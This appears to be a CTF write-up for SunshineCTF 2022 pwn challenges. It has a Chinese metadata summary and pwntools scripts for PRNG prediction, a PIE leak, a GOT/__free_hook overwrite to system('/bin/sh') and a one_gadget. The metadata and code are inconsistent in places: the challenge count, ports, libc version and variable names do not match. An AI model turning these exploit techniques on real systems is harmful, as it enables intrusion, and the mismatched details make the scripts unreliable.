---
title: SunshineCTF pwn
contest: SunshineCTF
year: 2022
difficulty: medium
vuln_type: pwn_unknown
tags: [libc-srand, prng-prediction, format-string-leak, elden-ring-themed, fsop, libc-2.27]
attack_chain:
- simulator 22000: 团队名 20 字节后 4 字节 seed
- libc.srand(seed) + libc.rand()%i+1 预测后续
- i=10,100,1000...999999999
- 22001 (chess): payload='r'+'8'*2+'r'*15+'r'*0x40+'b--'+str(4)+p8(0xc)+str(3000000000000)
- 调 menu(3) 触发 print ANSI color (escape \x1B[30;...m) 泄露栈地址
- color t + char_list.index 拼出 ans (PIE base + offset)
- getflag = ans + 0x1349
- 改 menu(1337) 输入 getflag
- 22003 (Elden): 0x20 名字 + 0x10 taunt 写 got['free'] 任意地址
- 触发 Mergot dropped 拿到 libc
- 第二次 NG+ p16(1)*8 + p64(freehook-8)*30 堆溢出
- 写 /bin/sh + system → free 时触发
- magic 22003 (MTG): menu(2) load(offset, 'aaa ', 1, puts_got, 0)
- menu(4) show 拿 libc，menu(5) one_gadget 0xe3b34
key_payload: libc.rand() % i + 1  # i = 10 * 10^n
one_liner: SunshineCTF 2022 Pwn (3 题)：simulator libc srand 预测 + chess ANSI color PIE 泄漏 + Elden Ring 主题题。
lesson: libc.srand 接受 4 字节 seed，team name 缓冲区紧接其后即可泄 seed；Elden 风格题的关键是找到 got 写入路径。
quality: medium
---
# SunshineCTF 2022 PWN (3 题)

## 1. Simulator (22000)
```python
from pwn import *
from ctypes import *

libc = cdll.LoadLibrary("libc.so.6")
p = remote('sunshinectf.games', 22000)

sla('team?\n[>] ', '11111111111111111111')  # 20 字节
ru('11111111111111111111')
seed = u32(p.recv(4))
libc.srand(seed)
i = 10
while i <= 999999999:
    sla('What is it?\n[>] ', str(libc.rand() % i + 1))
    i *= 10
p.interactive()
```

## 2. Chess (22001)
```python
# 触发 ANSI color escape sequence 泄露 PIE base
# payload: 'r' + '8'*2 + 'r'*15 + 'r'*0x40 + 'b--' + str(0x4) + p8(0xc) + str(3000000000000)
menu(3)
ans = 0xd
for i in range(1, 6):
    ru("\x1B[")
    t = int(io.recvuntil(';', drop=True))
    ru("m")
    ans += (0x80 if t == 30 else 0) + (char_list.index(io.recv(4))/4) << (8*i)
ans -= (0x564e56401d0d - 0x564e56400000)
getflag = ans + 0x1349

menu(1)
io.sendline(payload)
menu(3)
menu(1337)
sla("Make like a knight and jump!\n", str(getflag))
```

## 3. Elden Ring (22003)
```python
# 0x20 名字 + 0x10 taunt 写 got['free']
sa('what is thy name? : ', 'a'*0x20)
sla('What do you tell her before departing?\n: ', 'bbbb')
sla('3. Attempt to parry the incoming strike\n', str(2))
sla('3. Cast thunderbolt against the Warden\n', str(3))
sla('Leave a message? (y/n): ', 'y')
sa('Leave your message: ', 'bbb')
sla('3. Roll to the side\n: ', str(1))
sla('You decide to anger Mergot with a taunt. What do you say to him?\n: ', 'a'*0x10 + p64(elf.got['free']))
sla('emote\n', str(3))
ru('Mergot dropped ')
libcbase = int(p.recv(15)) - libc.sym['free']
system = libcbase + libc.sym['system']
freehook = libcbase + libc.sym['__free_hook']

# NG+ 第二轮
sla('3. Run away from Aethelwulf\n: ', str(2))
sla('critical hit\n', str(2))
sla('Would you like to start NG+? (y/n) : ', 'y')
sa('What do you tell her before departing?\n: ', p16(1)*8 + p64(freehook-8)*30)
sla('3. Attempt to parry the incoming strike\n', str(2))
sla('3. Cast thunderbolt against the Warden\n', str(3))
sla('Leave a message? (y/n): ', 'y')
sa('Leave your message: ', '/bin/sh\x00' + p64(system))
p.interactive()
```

## 4. MTG (Magic the Gathering)
```python
def load(offset, cont, d1, d2, d3):
    menu(2)
    payload = str(offset) + ' m ' + cont + str(d1) + ' ' + str(d2) + ' ' + str(d3)
    sla('Enter cards:', payload)

load(0x14, 'aaa ', 1, 0x405F60, 0)  # 0x405F60 = puts got
menu(4)
libcbase = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - libc.sym['puts']
system = libcbase + libc.sym['system']
binsh = libcbase + next(libc.search('/bin/sh'))
onegadget = libcbase + 0xe3b34  # libc 2.31

load(0x2d, 'aaa ', 1, onegadget&0xffffffff, onegadget>>32&0xffff)
menu(5)
p.interactive()
```
